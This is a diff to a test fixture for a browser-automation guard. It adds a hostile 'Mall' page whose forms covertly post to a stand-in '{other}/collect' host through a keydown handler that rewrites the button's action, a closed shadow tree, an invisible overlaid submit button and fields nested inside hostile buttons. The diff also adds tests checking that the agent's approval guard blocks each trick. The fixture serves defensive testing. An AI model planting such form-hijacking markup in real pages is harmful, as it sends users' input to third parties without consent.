@@ -69,6 +69,26 @@ const HOSTILE = `<h1>Shop</h1>
 <form action="/search"><input type="search" name="q" aria-label="Find in a new window"><button formtarget="_blank">Find</button></form>`;
 const BASED = `<base href="{other}/dir/"><h1>Notes</h1>
 <form action="notes" method="post"><input name="note" aria-label="Note"><button>Save</button></form>`;
+// Forms that send elsewhere than the page describer can tell: a keydown
+// handler that moves the search's default button to another site, a submit
+// button in a closed shadow tree around a control, a submit button laid over
+// a control, a field and a deeply nested control inside a hostile submit
+// button.
+const STRAY = `<h1>Mall</h1>
+<form action="/search" method="get" role="search"><input type="search" name="q" aria-label="Find a product" id="moving"><button>Find</button></form>
+<script>
+document.getElementById("moving").addEventListener("keydown", (event) => {
+  if (event.key !== "Enter") return;
+  const button = event.target.form.querySelector("button");
+  button.formAction = "{other}/collect";
+  button.formMethod = "post";
+});
+</script>
+<div><template shadowrootmode="closed"><form action="{other}/collect" method="post"><button><slot></slot></button></form></template><span tabindex="0">Reviews</span></div>
+<form id="specials" action="/search"></form>
+<span tabindex="0" style="position:relative;display:inline-block;padding:8px 24px">Specials<button form="specials" formaction="{other}/collect" formmethod="post" tabindex="-1" style="position:absolute;inset:0;opacity:0"></button></span>
+<form action="/search"><button formaction="{other}/collect" formmethod="post"><input name="size" aria-label="Shoe size"></button></form>
+<form action="/search"><button formaction="{other}/collect" formmethod="post" aria-label="Search">${"<span>".repeat(70)}<span tabindex="0">Deep reviews</span>${"</span>".repeat(70)}</button></form>`;
 
 export async function runSharedBrowserFormSubmissionFixture() {
   assert.ok(fs.existsSync(executablePath), "Locked Playwright Chromium is missing; run pnpm --filter @instafy/frontend exec playwright install chromium");
@@ -115,6 +135,8 @@ export async function runSharedBrowserFormSubmissionFixture() {
         response.end(page("Shop", fill(HOSTILE)));
       } else if (url.pathname === "/scenario/based") {
         response.end(page("Notes", fill(BASED)));
+      } else if (url.pathname === "/scenario/stray") {
+        response.end(page("Mall", fill(STRAY)));
       } else {
         response.end(page("Fixture", `<p>${request.method} ${url.pathname}</p>`));
       }
@@ -145,6 +167,7 @@ export async function runSharedBrowserFormSubmissionFixture() {
     for (const entry of table.cases) {
       const casePage = await context.newPage();
       await casePage.goto(`${sites().shop}/case/${entry.name}`);
+      if (entry.setup) await casePage.evaluate(`(() => { ${fill(entry.setup, entry.name)} })()`);
       const reported = await casePage.evaluate(`(() => {
         const element = document.getElementById("step");
         const result = (${rulesSource})().submissionOf(element, element.closest("form"));
@@ -337,9 +360,56 @@ export async function runSharedBrowserFormSubmissionFixture() {
     await delay(300);
     assert.deepEqual(sentTo(collect), [], "No cross-site POST without its confirmation");
 
+    // e. Forms the page moves or hides, under routine browsing on the same
+    // site. The step's guard stops a form the page posts to a site the step
+    // was not approved for, whatever sent it.
+    const strayPage = `${sites().mall}/scenario/stray`;
+    // A keydown handler moves the default button to another site after the
+    // person allowed Enter for the page's own search.
+    await runPage.goto(strayPage);
+    snapshot = await ok("GET", "/v1/snapshot");
+    field = control(snapshot, "Find a product");
+    start = prompts.length;
+    requests.length = 0;
+    await refused(/sent a form to http:\/\/other\.test:\d+\/?, which the step was not approved to send to/, "POST", "/v1/press", { index: field.index, snapshotId: snapshot.snapshotId, key: "Enter" }, ["allow_once"]);
+    assert.deepEqual(promptsSince(start), [["action", "press-enter", sites().mall]]);
+    await delay(300);
+    assert.deepEqual(sentTo(collect), [], "The moved form was stopped");
+    // A routine click on a control whose click reaches a submit button the
+    // describer cannot see: one in a closed shadow tree, one laid over it.
+    for (const label of ["Reviews", "Specials"]) {
+      await runPage.goto(strayPage);
+      snapshot = await ok("GET", "/v1/snapshot");
+      const hidden = control(snapshot, label);
+      start = prompts.length;
+      requests.length = 0;
+      await refused(/sent a form to http:\/\/other\.test:\d+/, "POST", "/v1/click", { index: hidden.index, snapshotId: snapshot.snapshotId });
+      assert.deepEqual(promptsSince(start), [], `${label}: routine, so nothing asked`);
+      await delay(300);
+      assert.deepEqual(sentTo(collect), [], `${label}: nothing was sent to the other site`);
+    }
+    // A field inside a hostile submit button: a click submits through that
+    // button, so it is refused before any prompt, as is typing with submit.
+    await runPage.goto(strayPage);
+    snapshot = await ok("GET", "/v1/snapshot");
+    const size = control(snapshot, "Shoe size");
+    start = prompts.length;
+    requests.length = 0;
+    await refused(/sits inside the form's submit button/, "POST", "/v1/click", { index: size.index, snapshotId: snapshot.snapshotId });
+    await refused(/sits inside the form's submit button/, "POST", "/v1/type", { index: size.index, snapshotId: snapshot.snapshotId, text: "42", submit: true });
+    assert.deepEqual(promptsSince(start), [], "Refused before any prompt");
+    // A control deep inside a hostile submit button asks, bound to the other
+    // site, and sends nothing when denied.
+    const deep = control(snapshot, "Deep reviews");
+    assert.equal(deep.tag, "span", "the control deep inside the button, not the button");
+    await refused(/approval_denied|denied/i, "POST", "/v1/click", { index: deep.index, snapshotId: snapshot.snapshotId }, ["deny"]);
+    assert.deepEqual(promptsSince(start), [["action", "click", sites().other]]);
+    await delay(300);
+    assert.deepEqual(sentTo(collect), [], "No cross-site POST without its confirmation");
+
     const result = {
       status: "passed",
-      fixtureVersion: 1,
+      fixtureVersion: 2,
       cases: table.cases.length,
       prompts: prompts.length,
       checks: [
@@ -349,6 +419,9 @@ export async function runSharedBrowserFormSubmissionFixture() {
         "a form that opens another window is refused before any prompt and opens nothing",
         "a relative action under <base href> is bound to the base's site",
         "under routine browsing, a label of a hidden submit button and Enter through a hostile default button still ask",
+        "a form a keydown handler moves to another site after approval is stopped before it is sent",
+        "a routine click that reaches a submit button in a closed shadow tree, or one laid over the control, sends nothing elsewhere",
+        "a field inside a submit button is refused before any prompt; a control nested deep inside one asks for the button's site",
       ],
       limitations: [
         "No model, Studio UI, origin or runtime shutdown guard; those are unit-tested.",
@@ -370,7 +443,7 @@ if (process.argv[1] && path.resolve(process.argv[1]) === fileURLToPath(import.me
     console.log(JSON.stringify(result, null, 2));
   }).catch((error) => {
     fs.mkdirSync(resultDirectory, { recursive: true });
-    fs.writeFileSync(resultFile, `${JSON.stringify({ status: "failed", fixtureVersion: 1 })}\n`);
+    fs.writeFileSync(resultFile, `${JSON.stringify({ status: "failed", fixtureVersion: 2 })}\n`);
     console.error(error.stack || error.message);
     process.exitCode = 1;
   });
